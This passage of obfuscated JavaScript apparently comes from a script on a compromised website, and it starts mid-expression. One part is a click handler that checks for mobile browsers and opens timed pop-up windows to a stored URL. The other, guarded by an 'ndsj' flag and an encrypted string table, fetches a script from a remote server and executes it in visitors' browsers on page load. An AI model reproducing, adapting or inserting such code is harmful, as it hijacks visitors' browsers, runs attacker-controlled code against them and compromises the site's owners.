)|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};